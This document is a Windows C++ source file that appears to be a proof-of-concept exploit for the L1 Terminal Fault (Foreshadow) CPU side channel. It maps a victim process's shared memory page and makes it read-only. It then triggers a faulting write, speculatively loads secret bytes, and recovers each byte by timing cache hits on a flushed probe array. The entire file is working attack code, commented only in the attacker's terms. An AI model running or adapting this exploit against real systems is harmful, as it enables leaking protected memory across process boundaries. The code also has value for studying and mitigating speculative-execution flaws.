// l1tf_attacker.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <intrin.h>

volatile PUCHAR IndexArray = NULL;
volatile unsigned long long t1, t2, td;
int c[4];
volatile USHORT byteIndex = 0;
#define CPU_CLOCK_CYCLES_TH 90

void flush_index_array()
{
	for (int n = 0; n < 256; n++)
	{
		_mm_clflush((PVOID)&IndexArray[n * 0x1000]);
	}
	_mm_mfence();
}

char secret_message[] = "GenuineYOLO";

bool __declspec(noinline) measure_index_array(volatile PUCHAR pucIndexArray)
{
	bool bContinue = false;
	unsigned int p;

	for (int n = 0; n < 256; n++)
	{
		volatile UCHAR x;

		t1 = __rdtscp(&p);
		x = pucIndexArray[n * 0x1000];
		t2 = __rdtscp(&p);
		__cpuid(c, 0);

		td = t2 - t1;

		//if ( n != 0 && td < CPU_CLOCK_CYCLES_TH && (int)secret_message[byteIndex] == n)
		if( n != 0 && td < CPU_CLOCK_CYCLES_TH )
		{
			if( n > '!' && n <= '~' )
				printf("PF[cpu:%d] byte: %02X (%c): time: %u (clocks)\n", p, n, n, (unsigned int)td);
			else
				printf("PF[cpu:%d] byte: %02X    : time: %u (clocks)\n", p, n, (unsigned int)td);

			_mm_clflush(&pucIndexArray[0]);
			__cpuid(c, 0);

			bContinue = true;
		}


		_mm_clflush(&pucIndexArray[n * 0x1000]);
		__cpuid(c, 0);
	}

//	if (bContinue)
//		printf("---\n");

	return bContinue;
}

int filter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	if (measure_index_array(IndexArray))
	{
		byteIndex++;
	}
	return EXCEPTION_EXECUTE_HANDLER;
}

int main()
{
	ULONG OldProtect;
	int ProcessorNumber = -1;
	printf("Attacker Process: %u\n", GetCurrentProcessId());

	// set current process affinity to 0
	if (SetProcessAffinityMask(GetCurrentProcess(), 1 << 1))
	{
		printf("[+] process affinity set\n");
	}
	else
	{
		printf("[-] unable to set process affinity\n");
		return 0;
	}

	__rdtscp((unsigned int *)&ProcessorNumber);

	printf("[*] Process running on precessor: %d\n", ProcessorNumber);

	HANDLE hFile = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "VictimSharedUncachedMemory");

	if (hFile == NULL)
	{
		printf("[-] unable to open shared memory file\n");
		return 0;
	}

	volatile PUCHAR pMem = (PUCHAR)MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, 0x1000);

	if (pMem == NULL)
	{
		printf("[-] unabled to create uncached vitcim memory mapping\n");
		return 0;
	}
	else
	{
		printf("[+] unached victim shared memory mapped: %p\n", pMem);
	}

	// tell victim process we are ready to set no access and place secret into shared physical page

	pMem[0] = 1;

	if (!VirtualProtect(pMem, 0x1000, PAGE_READONLY, &OldProtect))
	{
		printf("[-] unable to set shared page protection\n");
		return 0;
	}

	IndexArray = (PUCHAR)VirtualAlloc(NULL, 0x1000 * 256, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (IndexArray == NULL)
	{
		printf("[-] unable to allocate memory for index array\n");
		return 0;
	}
	else
	{
		// touch memory to create PTEs etc.
		memset(IndexArray, 0xAA, 0x1000 * 256);
		// flush memory
		flush_index_array();
	}

	volatile ULONG64 idx = 0, val = 0;

	while (1)
	{
		__try
		{
			//_mm_clflush((const void *)&byteIndex);			
			__cpuid(c, 0);
			//_mm_mfence();
			//trigger L1TF
			pMem[0xfff] = 0;
			//
			// speculative execution starts here
			//
			idx = pMem[byteIndex];
			val = IndexArray[(UCHAR)idx * 0x1000];			
			
			printf("TRY: %08x %08x\n", idx, val);
		}
		__except (filter(GetExceptionCode(), GetExceptionInformation()))
		{

		}		
	}

    return 0;
}

